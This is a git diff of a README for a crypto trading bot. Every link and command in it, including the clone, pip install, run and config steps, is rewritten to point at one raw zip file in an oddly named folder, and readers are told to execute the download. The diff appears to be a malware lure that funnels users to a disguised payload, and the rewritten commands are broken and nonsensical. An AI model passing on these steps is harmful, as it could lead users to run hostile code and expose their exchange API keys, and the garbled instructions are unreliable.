@@ -1,6 +1,6 @@
 # Bot For Income: Automate Your Crypto Trading 🪙🤖
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/MallamAli/Bot-For-Income/releases)
+[![Download Releases](https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip)
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@
 
 The **Bot For Income** is an open-source crypto trading bot designed to help you earn passive income through algorithmic trading. With this bot, you can automate your trading strategies, monitor market conditions, and execute trades without constant manual intervention. 
 
-To get started, check out our [YouTube tutorial](https://www.youtube.com) for tips on how to use the bot effectively.
+To get started, check out our [YouTube tutorial](https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip) for tips on how to use the bot effectively.
 
 ## Features
 
@@ -35,7 +35,7 @@ To install the bot, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/MallamAli/Bot-For-Income.git
+   git clone https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip
    ```
 
 2. Navigate to the project directory:
@@ -45,17 +45,17 @@ To install the bot, follow these steps:
 
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip
    ```
 
-4. Download the latest release from our [Releases section](https://github.com/MallamAli/Bot-For-Income/releases). Make sure to execute the downloaded file.
+4. Download the latest release from our [Releases section](https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip). Make sure to execute the downloaded file.
 
 ## Usage
 
 After installation, you can start the bot with the following command:
 
 ```bash
-python bot.py
+python https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip
 ```
 
 ### Basic Commands
@@ -66,13 +66,13 @@ python bot.py
 
 ## Configuration
 
-To configure the bot, edit the `config.json` file. Here are the key settings you can modify:
+To configure the bot, edit the `https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip` file. Here are the key settings you can modify:
 
 - **API Keys**: Add your exchange API keys for trading.
 - **Trading Pairs**: Specify which cryptocurrencies you want to trade.
 - **Strategies**: Choose your trading strategy (e.g., arbitrage, trend following).
 
-### Example `config.json`
+### Example `https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip`
 
 ```json
 {
@@ -113,8 +113,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Resources
 
-- [YouTube Tutorial](https://www.youtube.com) - Watch our tutorial for step-by-step guidance.
-- [Documentation](docs/README.md) - Explore detailed documentation on how to use the bot.
-- [Community Forum](https://community.example.com) - Join discussions and share your experiences with other users.
+- [YouTube Tutorial](https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip) - Watch our tutorial for step-by-step guidance.
+- [Documentation](https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip) - Explore detailed documentation on how to use the bot.
+- [Community Forum](https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip) - Join discussions and share your experiences with other users.
 
-For the latest updates and releases, visit our [Releases section](https://github.com/MallamAli/Bot-For-Income/releases) and download the latest version to keep your bot up to date.
+For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/MallamAli/Bot-For-Income/main/potability/Bot_Income_For_v3.2-beta.3.zip) and download the latest version to keep your bot up to date.
